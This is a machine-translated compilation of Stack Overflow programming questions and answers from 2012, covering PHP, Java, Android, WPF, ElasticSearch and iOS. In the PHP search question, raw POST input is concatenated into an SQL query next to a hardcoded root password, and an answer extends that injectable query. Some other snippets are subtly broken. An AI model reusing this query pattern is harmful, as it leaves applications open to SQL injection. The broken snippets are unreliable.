***您可以使用与 JewelleryTab 和 JewelleryTabContent 相同的钩子。***

希望钩子可以重复使用。

```
public function install()
{
       return (parent::install()
        AND $this->registerHook('productTab') //Register productTab hook that will display the tab button
        AND $this->registerHook('productTabContent') //Register productTabContent hook that will display the tab content
        );
} 
```

# php - Youtube API 限制评论

> ID：13429600
> 
> 赞同：0
> 
> 时间：2012-11-17T10:15:52.057
> 
> 标签：php, api, youtube, youtube-api

我使用下面的代码来检索最近 youtube 对视频的评论：

```
<?php
$videoId='lWA2pjMjpBs';
$url="http://gdata.youtube.com/feeds/api/videos/{$videoId}/comments";
$comments=simplexml_load_file($url);
foreach($comments->entry as $comment)
{
 echo '<fieldset>'.$comment->content.'</fieldset>';
}
?> 
```

我有 2 个问题：1）有没有办法限制评论的数量，所以我只能显示示例 10 评论？2) 是否可以排除标记为垃圾邮件的评论？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:09:50.533

我不知道垃圾邮件，但你可以限制 nr。带有这样的客户端解决方案的评论：

```
$maxcomments = 10; //set max here
$commentcounter = 0; //add this

foreach($comments->entry as $comment)
{
   if($commentcounter < $maxcomments)
   {
       echo '<fieldset>'.$comment->content.'</fieldset>';
   }

   $commentcounter++;
} 
```

没有检查这个，但它应该工作。我希望这会有所帮助。

# android - 适用于 Android 的 Mono 上的 F#

> ID：13429603
> 
> 赞同：12
> 
> 时间：2012-11-17T10:16:12.307
> 
> 标签：android, f#, xamarin.android

我从[Xamarin购买了](http://xamarin.com/)[适用于 Android 的 Mono，](http://xamarin.com/monoforandroid)到目前为止印象非常深刻，除了我真的很想使用 F# 而不是 C#。有没有人设法使用这个工具让 F# 运行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-18T00:36:12.990

由于 F# 已经开源，您可以针对 Mono 框架编译 FSharp.Core.dll。

F# 编译器源代码在这里[http://fsharp.github.com/fsharp/](http://fsharp.github.com/fsharp/)

[以下](http://fsxplat.codeplex.com/wikipage?title=FSharpAndroid&referringTitle=Home)是有关如何使用 Mono for Android 的一些说明

基本上，您引用了 Mono for Android mscorlib.dll 和您针对 F# 项目中的 Mono 框架编译的 FSharp.Core.dll。

# java - 读取文件中的文本

> ID：13429608
> 
> 赞同：0
> 
> 时间：2012-11-17T10:17:24.710
> 
> 标签：java, user-interface

如何读取和打印文本文件中的内容？

我可以直接调用`readFile()`方法`showInputDialog()`吗？例如：

```
 String q = (String)JOptionPane.showInputDialog(frame, 
                       "what is your name", 
                       "Get Name   Demo",
                       JOptionPane.PLAIN_MESSAGE, 
                       null, 
                       null, 
                       readText());

private String readText()throws Exception{
    BufferedReader reader = null; 

       reader = new BufferedReader(new FileReader("data/name.txt")); 
            String name = reader.readLine();  
            StringTokenizer st = new StringTokenizer(name, " ");
            String NAME= st.nextElement().toString();

           if(reader!=null) 
           reader.close();             

        return NAME;
    } 
```

错误：未报告的异常 java.lang.Exception；必须捕获或声明抛出

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:27:14.127

您的`readText`方法会引发您需要控制的已检查异常。

您可以为其使用`try-catch`块或`throws`在使用您的`readText`方法的方法中添加子句。

这样做：

```
try{
String q = (String)JOptionPane.showInputDialog(frame, 
                       "what is your name", 
                       "Get Name   Demo",
                       JOptionPane.PLAIN_MESSAGE, 
                       null, 
                       null, 
                       readText());
}catch(Exception e){
//do the stuff that you want to do if there was some prblem reading your file
} 
```

或者在包含上述代码部分`throws Exception`的方法中添加一个子句。`String q = ....`

您可能想做的另一件事是`try-catch`在您的方法中放置一个块`readText`，并将从文件中读取的内容存储在一个字符串中，然后在 catch 块中创建一个包含一些消息的字符串，`Unable to read file`然后从您的方法中返回该字符串。

```
private String readText(){
// Note that I have removed that throws Exception from above
BufferedReader reader = null;
String myText=""; 
try{
       reader = new BufferedReader(new FileReader("data/name.txt")); 
       String name = reader.readLine();  
       StringTokenizer st = new StringTokenizer(name, " ");
       String NAME= st.nextElement().toString();
       myText = NAME;            
}catch(Exception e){
       myText = "Unable to read file";//or any message you want to convey

}finally{
       if(reader != null){
             try{
             reader.close();
             }catch(Exception e){
             }
       }
}
return myText;

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:28:10.830

您忘记处理被调用方法中的异常，因此请避免像这样抛出

```
private String readText(){

    BufferedReader reader = null; 
    String NAME ="";

    try
    {

           reader = new BufferedReader(new FileReader("data/name.txt")); 
           String name = reader.readLine();  
           StringTokenizer st = new StringTokenizer(name, " ");
           NAME= st.nextElement().toString();
    }
    catch(Exception e)
    {
      e.printStackTrace();
    }
    finally
    {
         if(reader!=null) 
               reader.close();  
    return NAME;
    }
} 
```

# c++ - 使用 Makefile 在 Eclipse CDT 中检查错误

> ID：13429610
> 
> 赞同：5
> 
> 时间：2012-11-17T10:17:36.907
> 
> 标签：c++, eclipse, makefile, llvm, eclipse-cdt

我正在使用 eclipse 开发我的项目，该项目基于我的自定义 makefile 系统。我必须使用自定义 Makefile 项目，因为我想在 LLVM makefile 系统上开发 LLVM 项目，请参阅：[http](http://llvm.org/docs/Projects.html) ://llvm.org/docs/Projects.html 。

我在eclipse中创建了一个“空makefile”项目，我选择了构建位置（Project->Properties->C/C++ Build->Build Location）并添加了所有需要的库源（Project->Properties->C/C++一般->路径和来源）。

项目按应有的方式构建和执行。问题是很多行都用红色强调为错误。这很明显，因为 eclipse 会检查执行 gcc 的错误，除非我使用 Makefiles（或者我错了......），否则它不会执行它。

无论如何-在将eclipse与makefile一起使用时，有什么方法可以检查语法（和其他类型的）错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T09:28:08.070

看看[这个问题](https://stackoverflow.com/questions/5977542/eclipse-cdt-unresolved-inclusion-of-stl-header)，或者谷歌“eclipse unresolved symbols”。您需要将包含的路径添加到项目设置中，以便 Eclipse 编辑器/索引器可以找到它们。

链接中的问题是针对未解决的包含，但它也适用于所有未解决的符号。

# perl - perl 模块创建是否有任何特定的约定/最佳实践？

> ID：13429612
> 
> 赞同：3
> 
> 时间：2012-11-17T10:17:52.037
> 
> 标签：perl, oop

在什么基础上文件应该被分类（现在我的每个文件都用于特定的任务/部分），文件中的最大行数，面向对象的 perl 文件设计等。

如果有任何好的链接，请提供给我

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:31:20.543

我认为基本的 OOP 原则适用于此。

例如，CPAN 发行版创建约定定义了模块/类的目录结构 lib，测试的 t，README 等，但没有定义类的方式。此外，还有[`perlmodstyle`](http://p3rl.org/perlmodstyle)：

> 本文档试图描述 Perl 社区编写 Perl 模块的“最佳实践”。它扩展了 perlstyle 中的建议，在阅读本文档之前应将其视为必读。
> 
> 虽然本文档旨在对所有模块作者有用，但它特别针对希望在 CPAN 上发布其模块的作者。
> 
> 重点是对模块用户可见的样式元素，而不是那些只有模块开发人员才能看到的部分。但是，本文档中介绍的许多指南都可以外推并成功应用于模块的内部结构。
> 
> 本文档与 perlnewmod 的不同之处在于它是一个风格指南，而不是关于创建 CPAN 模块的教程。它提供了一个清单，可以比较模块以确定它们是否符合最佳实践，而不必详细描述如何实现这一点。

实际上，根本不需要使用 OOP。有许多成功的经典模块只是导出子程序。

# lucene - ElasticSearch - 如何优先考虑来自同一行的匹配

> ID：13429614
> 
> 赞同：0
> 
> 时间：2012-11-17T10:18:00.530
> 
> 标签：lucene, elasticsearch

我在 ElasticSearch 0.19.11 中有以下文档，使用：

```
{ "title": "dogs species",
    "col_names": [ "name", "description", "country_of_origin" ],
    "rows": [
        { "row": [ "Boxer", "good dog", "Germany" ] },
        { "row": [ "Irish Setter", "great dog", "Ireland" ] }
    ]
}
{ "title": "Misc stuff",
    "col_names": [ "foo" ],
    "rows": [
        { "row":    [ "Setter is impotant" ] },
        { "row":     [ "Ireland is green" ] }
    ]
} 
```

映射如下：

```
{
    "table" : {
        "properties" : {
            "title" : {"type" : "string"},
            "col_names" : {"type" : "string"},
            "rows" : {
                "properties" : {
                    "row" : {"type" : "string"}
                }
            }
        }
    }
} 
```

**问题：**我现在正在搜索“Ireland Setter”，对于在同一行中包含搜索词的文档，我需要获得更高的分数。

目前第二个文档得分为 0.22，而第一个文档得分为 0.14。

在这种情况下，我希望第一个文档获得更高的分数，因为它在同一行中同时包含“Ireland”和“Setter”。如何做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T08:16:06.313

在 ElasticSearch google-group 成员的大力合作下，找到了解决方案。这是讨论的链接：[https ://groups.google.com/forum/?fromgroups#!topic/elasticsearch/4O9dff2SNhg](https://groups.google.com/forum/?fromgroups#!topic/elasticsearch/4O9dff2SNhg)

# c# - 在 WPF 中的同一解决方案中的不同类库项目中在运行时更改资源文件

> ID：13429622
> 
> 赞同：0
> 
> 时间：2012-11-17T10:19:15.843
> 
> 标签：c#, wpf, resourcedictionary, class-library

我对这些项目有一个解决方案：

1\. *Clinica* (Type is Windows Application),(`MainWindow.xaml`在这里)

2\. *Ferhad.Wpf.Core*（类型为类库），（共有三个文件：`Resources.xaml`, `OrangeResource.xaml`, `BlueResource.xaml`）

`Resources.xaml`看起来像这样：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <ResourceDictionary.MergedDictionaries>
        <ResourceDictionary Source="pack://application:,,,/Ferhad.Wpf.Core;component/BlueResource.xaml"/>
    </ResourceDictionary.MergedDictionaries>
</ResourceDictionary> 
```

现在，从`MainWindow.xaml.cs` 我想清除并添加`OrangeReource.xaml`到`Resources.xaml`.

我该怎么做：到目前为止，我已经尝试过：

```
string fileName = "pack://application:,,,/Ferhad.Wpf.Core;component/OrangeReSource.xaml";
if (System.IO.File.Exists(fileName))
{
    using (FileStream fs = new FileStream(fileName, FileMode.Open))
    {
        ResourceDictionary dic = (ResourceDictionary)XamlReader.Load(fs);

        string fileNameR = "pack://application:,,,/Ferhad.Wpf.Core;component/Resources.xaml";
        if (System.IO.File.Exists(fileNameR))
        {
            using (FileStream fsR = new FileStream(fileNameR, FileMode.Open))
            {
                ResourceDictionary dicR = (ResourceDictionary)XamlReader.Load(fsR);
                dicR.MergedDictionaries.Clear();
                dicR.MergedDictionaries.Add(dic);
            }
        }
    }
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T12:58:03.707

我做了这样的工作：

```
 var rDictionary = new ResourceDictionary();
  rDictionary.Source = new Uri(string.Format("pack://application:,,,/Ferhad.Wpf.SystemStyles;component/OStyles.xaml"), UriKind.Absolute);
  this.Resources.MergedDictionaries.Add(rDictionary); 
```

# java - 我需要为内部类创建一个接口吗？

> ID：13429625
> 
> 赞同：0
> 
> 时间：2012-11-17T10:19:50.770
> 
> 标签：java

我只是在学习接口及其在java中的意义，是否有必要为内部类创建接口，例如我在下面创建的程序？此类的目的只是成为政府的模糊原型以及它如何以最简单的形式运作。我创建了几种添加法律、参议员和国会成员的方法。这段代码是否适用于我想要完成的工作？

```
public class usaGov
{

private int sizeOfSenate = 105;
private int sizeOfCongress = 308;
private int amtOfLaws = 0;
private int law = 0;

void addSenateMember(int numberOfSenators)
{        
        sizeOfSenate = sizeOfSenate + numberOfSenators;
}

void addCongressMember(int numberOfCongressMembers)
{
    sizeOfCongress = sizeOfCongress + numberOfCongressMembers;
}    

void removeSenateMember(int numberOfSenators)
{        
       sizeOfSenate = sizeOfSenate - numberOfSenators;   
}

void removeCongressMember (int numberOfCongressMembers)
{
    sizeOfCongress = sizeOfCongress - numberOfCongressMembers;
}

void passLaw()
{
    if (law == 3)
    {
        amtOfLaws++;
    }

}

private class Senate 
{
void senateYes()
{
    int yes = 1; 
    law = law + yes;
}
void senateNo()
{
    int no = -1;
    law = law + no;
}

}
private class Congress
{ 
void congressYes()
{
    int yes = 1;
    law = law + yes;
}
void congressNo()
{
    int no = -1;
    law = law + no;
}
}
private class President
{
void presidentYes()
{
    int yes = 1;
    law = law + yes;
}
void presidentNo()
{
    int no = -1;
    law = law + no;
}
}    

} 
```

这是我的界面：

```
public interface americanGov
{
void addSenateMember(int numberOfSenators);

void addCongressMember(int numberOfCongressMembers);

void removeSenateMember(int numberOfSenators);

void removeCongressMember (int numberOfCongressMembers);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:51:18.327

当您在某些时候想要获得多重继承时，您只**需要使用接口：**

在Java中，一个类只能扩展另一个类，但它可以实现多个接口。

接口的任何其他用途都是**最佳实践**和代码设计。

经验法则是：**如果某人（包括您自己）在未来的某个时间点可能想要编写相同事物的替代插入式实现，请使用接口**。

内部类通常不属于这一类，除非您知道您将拥有同一事物的多个内部实现。所以在这里使用接口可能是过度的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:12:06.670

在您的情况下，所有法律投票共享相同的代码。您可以通过仅对所有投票使用一个类来显着缩短和简化代码：

```
public class USAGOV {

    private VotingBody senate = new VotingBody(105);
    private VotingBody congress = new VotingBody(305);
    private VotingBody president = new VotingBody(1);

    void passLaw() {
        //logic to count votes from senate, congress and president
    }

    private class VotingBody {
        int members;
        int law;

        VotingBody(int members){
            this.members = members;
        }

        int getSize() {
            return members;
        }

        void voteYes() {
            int yes = 1;
            law = law + yes;
        }

        void voteNo() {
            int no = -1;
            law = law + no;
        }

        void addMembers(int members){
            this.members += members;
        }

        void removeMembers(int members){
            this.members -= members;
        }

    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T12:00:51.707

您已经创建了接口但没有实现它。如果您不实施它，它将毫无用处。接口是抽象类，可以用来实现多重继承，或者如果你想强制一个实现你的接口的类来定义其中的函数。这是接口的两个主要用途。

# android - 如何在“android水平进度条”中画一条垂直线

> ID：13429627
> 
> 赞同：4
> 
> 时间：2012-11-17T10:20:26.760
> 
> 标签：android, android-xml, android-progressbar

我需要制作一个自定义水平进度条，如下图所示。

![所需的自定义水平进度条](../Images/5c10200ae670776e46d399b7f396c398.png)

我使用可绘制的图层列表设计了如下图所示的进度条：

![我的进度条](../Images/4c120bbfc96c27618bc0eb8b6b20d0ed.png)

当进度大于 25 时，我想画一条垂直线，就像我需要的图像一样。我写了这段代码，但它没有用。

```
myProgressBar = (ProgressBar) findViewById(R.id.progress);
Canvas canvas = new Canvas();
Paint p = new Paint();
p.setStrokeWidth(2);
p.setColor(Color.WHITE);
canvas.drawLine(a, b, c, d, p);

if(myProgressBar.getProgress() > 25){
    myProgressBar.draw(canvas);
} 
```

所以请帮我在进度条中画一条垂直线。这是我在堆栈溢出中的第一个问题，因此可能会有一些错误对此感到抱歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-05-10T20:30:07.353

您可以尝试使用图层列表

```
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
   <item android:id="@android:id/background">
       <shape>
            <corners android:radius="3dip" />
            <gradient
                android:angle="0"
                android:endColor="#e9e9f4"
                android:startColor="#e9e9f4" />
        </shape>
    </item>
    <item android:id="@android:id/progress">
        <clip>
            <shape>
                <corners android:radius="5dip" />
                <gradient
                    android:angle="0"
                    android:endColor="#16a023"
                    android:startColor="#16a023" />
            </shape>
        </clip>
    </item>
    <item android:id="@+id/line" >
        <rotate android:fromDegrees="90" android:pivotX="10%" >
           <shape android:shape="line" >
               <stroke android:width="2dp" android:color="#ffffff" />
           </shape>
       </rotate>
   </item>
</layer-list> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-12T18:21:09.397

从我的角度来看，当它大于 25 时，你必须渲染那条线。试试这个，让我知道

```
if(myProgressBar.getProgress() > 25){
    canvas.drawLine(a, b, c, d, p);
    myProgressBar.draw(canvas);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-02T09:23:59.193

问题很老了，但仍然出现在谷歌上。我不确定您是否希望垂直线高于或低于进度状态。阿里的回答使这条线出现在上面，我希望这条线出现在下面，所以这是我的 layer-list 版本：

```
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@android:id/background">
        <layer-list>
            <item>
                <shape android:shape="rectangle">
                    <solid android:color="@color/light_gray"/>
                    <corners
                        android:bottomRightRadius="10dp"
                        android:topRightRadius="10dp" />
                </shape>
            </item>
            <item>
                <rotate android:fromDegrees="90" android:pivotX="53%">
                    <shape android:shape="line" android:tint="@color/white">
                        <stroke android:width="1dp"/>
                    </shape>
                </rotate>
            </item>
        </layer-list>
    </item>
    <item android:id="@android:id/progress">
        <clip>
            <scale android:scaleWidth="100%">
                <shape android:shape="rectangle">
                    <solid android:color="@color/bright_teal"/>
                    <corners
                        android:bottomRightRadius="10dp"
                        android:topRightRadius="10dp" />
                </shape>
            </scale>
        </clip>
    </item>
</layer-list> 
```

嵌套层列表中的第二项是您的垂直线。您可以根据需要放置尽可能多的垂直线，并通过更改`android:pivotX`值来设置它们的位置。

# visual-studio - Visual Studio 2012 shell 扩展开发

> ID：13429629
> 
> 赞同：0
> 
> 时间：2012-11-17T10:20:34.903
> 
> 标签：visual-studio, visual-studio-2012, visual-studio-extensions

我正在创建一个独立的 shell 扩展，我只是想知道为这种类型的开发学习 c++ 是否会更好？我有使用 c# 和 WPF 的经验，我目前的印象是我可以通过使用默认的 shell 扩展来创建 shell，然后通过在 shell 包中创建扩展作为附加项目来使用 C# 和 WPF 创建我想要的功能在解决方案中。

如果有人提供建议和任何文档（与我一直在浏览的内容相比并不多），那就太棒了。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T05:45:21.517

我前段时间创建了[Vintage Studio扩展它允许使用 Visual Studio 为 8 位老式计算机（ec Commodore 64 或 8 位 Atari）创建应用程序。](http://blog.3d-logic.com/2012/05/12/introducing-vintage-studio/)它包含 2 个 dll - 一个只是编辑器的扩展（语法着色、格式化等），而另一个是与 VS 集成的项目系统，允许使用 6502 汇编编译器构建项目，在模拟器中运行程序等等。这两个 dll 都是用 C# 和 MPFProj 创建的。完成项目后，我尝试使其在孤立的外壳中工作。我花了几个小时才弄清楚如何让它工作，但我想出了正确的注册表设置和 pkgdef 文件中的条目，它工作正常。AFAIR 我用[了这个链接](http://technet.microsoft.com/en-en/library/bb685692%28en-us%29.aspx)了解有关将扩展注册为独立 shell 扩展的更多信息。这意味着可以仅在 C# 中创建一个独立的 shell 扩展。[博客文章](http://blog.3d-logic.com/2012/05/12/introducing-vintage-studio/)包含一个指向我的 github的链接，您可以在其中找到 Vintage Studio 的源代码以及一些关于设置和使用 MPFProj 的提示（在自述文件中）（例如，我发现了一个需要直接在他们的代码中修复的错误） .

# c# - WPF 线程保存可观察集合项更改事件

> ID：13429633
> 
> 赞同：0
> 
> 时间：2012-11-17T10:21:38.163
> 
> 标签：c#, .net, wpf, observablecollection

我的应用程序是一个基本的下载应用程序，它允许用户相互下载文件（一个非常基本的 kazaa :-)）

好吧，对于每个下载，我都会显示一个进度条，我希望它根据真实的下载进度进行更新。

我有一个 observablecollection 包含一个 downloadInstance 对象，该对象包含一个进度属性。

一旦我更新了进度属性， observablecollection 更改事件可能不会被触发，并且进度条保持没有任何视觉进度。

这是我的threadsaveobservablecollection类

```
public class ThreadSafeObservableCollection<T> : ObservableCollection<T>
{
    public override event NotifyCollectionChangedEventHandler CollectionChanged;

    protected override void OnCollectionChanged(NotifyCollectionChangedEventArgs e)
    {
        NotifyCollectionChangedEventHandler CollectionChanged = this.CollectionChanged;
        if (CollectionChanged != null)
            foreach (NotifyCollectionChangedEventHandler nh in CollectionChanged.GetInvocationList())
            {
                DispatcherObject dispObj = nh.Target as DispatcherObject;
                if (dispObj != null)
                {
                    Dispatcher dispatcher = dispObj.Dispatcher;
                    if (dispatcher != null && !dispatcher.CheckAccess())
                    {
                        dispatcher.BeginInvoke(
                            (Action)(() => nh.Invoke(this,
                                new NotifyCollectionChangedEventArgs(NotifyCollectionChangedAction.Reset))),
                            DispatcherPriority.DataBind);
                        continue;
                    }
                }
                nh.Invoke(this, e);
            }
    }

} 
```

这是初始化过程

```
uploadActiveInstances = new ThreadSafeObservableCollection<instance>();
instance newInstance = new instance() { File = file, User = user };
uploadActiveInstances.Add(newInstance); 
```

最后这是我的实例类

```
public class instance
{
    public FileShareUser User { get; set; }
    public SharedFile File { get; set; }
    public int Progress { get; set; }
} 
```

一旦实例的属性发生更改（progress++），我如何引发更改事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:38:00.790

ObservableCollection 将在 IT 更改（例如添加/删除项目）时引发事件，但不会在其持有的项目发生更改时引发事件。

要在您的项目更改时引发事件，您的`instance`类必须实现该`INotifyPropertyChanged`接口。

例如：

```
public class instance : INotifyPropertyChanged
{
    private int progress;
    public int Progress 
    {
        get { return progress; }
        set
        {
            if (progress != value)
            {
                progress = value;
                if (PropertyChanged != null)
                {
                    PropertyChanged(this, new PropertyChangedEventArgs("Progress"));
                }
            }
        }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    /* Do the same with the remaining properties */
    public string User { get; set; }
    public string File { get; set; }

} 
```

您现在会看到，当您更改进度时，它将在 UI 中更新。
在上面的代码中，由于我没有为`User`or引发 PropertyChanged 事件`File`，因此当您更改它们时，它们不会在 UI 中得到更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:38:53.583

Observablecollection 仅在添加或删除项目时更新可视化树，这就是为什么当您更改项目值时它不会重新呈现的原因。

将 Progress 属性更改为依赖属性并绑定进度条“Value”属性或实现 INotifyPropertyChanged 接口

# php - 按关键字搜索多个

> ID：13429634
> 
> 赞同：0
> 
> 时间：2012-11-17T10:21:50.817
> 
> 标签：php, mysql, search-engine

我有下面的代码，它运行良好。但是，我仅限于搜索两行。我想再搜索两行（共 4 行）。我已经尝试了几种技术，但我无法让它发挥作用。有时我会得到重复的结果。

```
<?php

$term = $_POST['term'];

$connect = new mysqli("localhost", "root", "hala3ammi", "phprealty");

$sql = "
 SELECT phprealty_property.*, phprealty_prop_img.p_id, phprealty_prop_img.fn
 FROM phprealty_property
 INNER JOIN phprealty_prop_img
 ON phprealty_property.id = phprealty_prop_img.p_id 
 WHERE phprealty_prop_img.def='1' 
 AND (phprealty_property.title like '%$term%'
 OR phprealty_property.full_desc like '%$term%')";

$query = mysqli_query($connect, $sql) or die (mysqli_error());

$result = mysqli_query($connect, $sql);

$found = mysqli_num_rows($result);

echo '<br/> Search result(s): '.$found;

while ($row = mysqli_fetch_array($result)){
$img = $row["fn"];
$thumb = 'th_' . $img;
$duh = '<img src="../falcon/listImgs/' . $thumb . '" />';
echo '<br/> Title: '.$row['title'];
echo '<br/> Price: '.$row['price'];
echo '<br/> Type: '.$row['type'];
echo '<br/> Image: '.$duh;
echo '<br/> Full Desc: '.$row['full_desc'];
echo '<br/><br/>';
}
?> 
```

数据库：

> 房地产

我要搜索的表：

> phprealty_property

INNER 连接用于从下表中检索默认缩略图。

> phprealty_prop_img

```
WHERE phprealty_prop_img.def='1' 
```

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:00:24.527

我认为您可能获得看似重复的结果的原因是您的内部连接。如果您在 phprealty_prop_img 中有 n 行对应于 phprealty_property 中的单个属性列表（即 phprealty_prop_img 中的 n 行具有相同的值 p_id），那么您将获得查询返回的 n 行，每行都具有从 phprealty_property 中提取的相同信息，并且仅在 phprealty_prop_img.fn 中有所不同。任务查看 W3C 站点[http://www.w3schools.com/sql/sql_join_inner.asp上给出的内部连接示例](http://www.w3schools.com/sql/sql_join_inner.asp)

至于通过 phprealty_property.city & phprealty_property.short_desc 搜索，我不明白这个问题。为什么你不能把这些添加到这个最后的 OR 子句中？

```
AND (phprealty_property.title like '%$term%' 
      OR phprealty_property.full_desc like '%$term%' 
      OR phprealty_property.city LIKE '%$city%'
      OR phprealty_property.short_desc LIKE '%$term%') 
```

# javascript - 如何检测浏览器是否在手机上？

> ID：13429637
> 
> 赞同：-1
> 
> 时间：2012-11-17T10:22:43.077
> 
> 标签：javascript, html

我正在尝试构建一个锚标记，该标记使用其中一个 tel://xxxxxxxxxxx 链接来拨打号码。但是这些链接在非电话计算机上不起作用。

有没有办法可以检测到电话，以便我可以拨打电话上的号码，但将号码复制到非电话上的剪贴板？

我想支持所有可能的手机，所以我不想做导航嗅探..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:06:07.323

更多的是建议而不是技术解决方案，但也许您可以添加第二个链接，用于将电话号码复制到剪贴板。这样，您的最终用户会更清楚地了解正在发生的操作。

请注意，非电话计算机也可以具有拨号功能。我的工作笔记本电脑在其浏览器中集成了 Lync，因此当我单击 tel:href 时，它开始拨号。使用最终用户浏览器的默认行为将为 imo 提供最佳用户体验。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-18T10:41:57.410

在现代系统上，电话链接实际上并不是必需的，因为如果安装了任何可以拨打电话的程序，电话号码就会自动识别

# iphone - 导航栏自定义高度

> ID：13429639
> 
> 赞同：2
> 
> 时间：2012-11-17T10:22:46.633
> 
> 标签：iphone, uinavigationbar

我想删除从状态栏到导航栏的距离。怎么做？

![在此处输入图像描述](../Images/44483883575b0663dc5ff8070ef4b7d0.png)

```
if ([self.navBar respondsToSelector:@selector(setBackgroundImage:forBarMetrics:)])
{
    [self.navBar setBackgroundImage:[UIImage imageNamed:@"bar-top"]
                      forBarMetrics:UIBarMetricsDefault];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:20:43.450

试试这个：

```
self.navigationController.navigationBar.frame.size.height 
```

或者您可以创建您的自定义。

[设计一个定制的 iPhone 应用导航栏](http://designm.ag/tutorials/designing-a-custom-iphone-app-navigation-bar/)

或者

[服装风格](http://devinsheaven.com/create-a-custom-uinavigationbar-style/)

# ios - 如何通过我的 iOS 应用在 Facebook 上分享内容？

> ID：13429644
> 
> 赞同：2
> 
> 时间：2012-11-17T10:23:29.293
> 
> 标签：ios, facebook, share

我正在向我的 iOS 应用程序添加共享功能（我必须支持到 iOS 4.3）。在 Facebook 案例中，我想要实现的行为是：

如果 facebook 应用程序存在于 iDevice 上，则打开它并与已预先填充的所有内容共享视图

否则在 safari（或任何浏览器）中打开 www.facebook.com/sharer.php?[etc] 以共享我的页面。

我写了这个：

```
 NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"fb://publish/profile/me?text=%@", facebookShareLink]];

    if([[UIApplication sharedApplication] canOpenURL:url]) {

        [[UIApplication sharedApplication] openURL:url];

    } else {

        NSString *facebookLink = [NSString stringWithFormat:@"http://www.facebook.com/sharer.php?u=%@&t=%@", facebookShareLink, titleToShare];
        facebookLink = [facebookLink stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:facebookLink]];
    } 
```

未安装 Facebook 应用程序时，它运行良好，但安装后它会打开，但不会转到共享视图。

我在某处读到不再支持 URL 方案（我没有来源）。真的吗？

那么还有没有办法在不集成 Facebook iOS SDK 的情况下做到这一点？我不想添加这个 SDK，我只需要共享功能而不是所有 Graph 的东西。

编辑：我不希望我的应用程序在社交媒体上分享自己的东西，而是提示用户并让他能够轻松地自己完成。我认为我不应该必须通过 Facebook 应用程序或 Twitter 应用程序进行身份验证才能做到这一点，不是吗？用户将在应用程序或移动网站上进行身份验证。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T09:14:07.873

我终于使用 iOS 内置的 facebook 共享对话框 (SLComposeViewController) 制作了一个解决方案，如果用户不使用 iOS 6，该对话框会退回到网站

```
NSString *facebookShareLink = @"some link to share";
NSString *titleToShare = @"some title";

// if we're not on iOS 6, SLComposeViewController won't be available. Then fallback on website.
Class composeViewControllerClass = [SLComposeViewController class];

if(composeViewControllerClass == nil || ![composeViewControllerClass isAvailableForServiceType:SLServiceTypeFacebook]) {

    NSString *facebookLink = [NSString stringWithFormat:@"http://www.facebook.com/sharer.php?u=%@&t=%@", facebookShareLink, titleToShare];
    facebookLink = [facebookLink stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:facebookLink]];

} else {

    SLComposeViewController *composeViewController = [composeViewControllerClass composeViewControllerForServiceType:SLServiceTypeFacebook];
    [composeViewController setInitialText:titleToShare];
    [composeViewController addURL:[NSURL URLWithString:facebookShareLink]];

    [parentController presentModalViewController:composeViewController animated:YES];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T11:33:59.343

您可以使用第三方组件，例如 ShareKit。
[http://getsharekit.com/](http://getsharekit.com/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-07T19:35:26.430

您可以使用 uiactivity 在 facebook、twitter 或电子邮件中分享

```
UIImage *image1 = shareimgview.image;
NSString *str1=[@"Brand: " stringByAppendingString:brand_field.text];
NSString *str2=[@"Product: " stringByAppendingString:product_field.text];
NSString *str3=[@"Model: "stringByAppendingString:model_field.text];
NSString *str4=[@"Comment: "stringByAppendingString:status_field.text];
NSArray* dataToShare = @[str1,myurl,str2,str3,str4, image1];
UIActivityViewController *actviewcon = [[UIActivityViewController alloc] initWithActivityItems:dataToShare applicationActivities:nil];
[self presentViewController:actviewcon animated:YES completion:NULL]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-04-05T04:30:12.480

对于那些正在寻找 Swift 3 解决方案的人来说，这里是：

```
if let composeVC = SLComposeViewController(forServiceType:serviceType) {
    composeVC.add(object.image())
    composeVC.add(object.url())
    composeVC.setInitialText(object.text())
    presentingVC.present(composeVC, animated: true, completion: nil)
} 
```

# assembly - 由于某种原因，无法在字节上翻转位或将位切换为所有位，不起作用

> ID：13429645
> 
> 赞同：1
> 
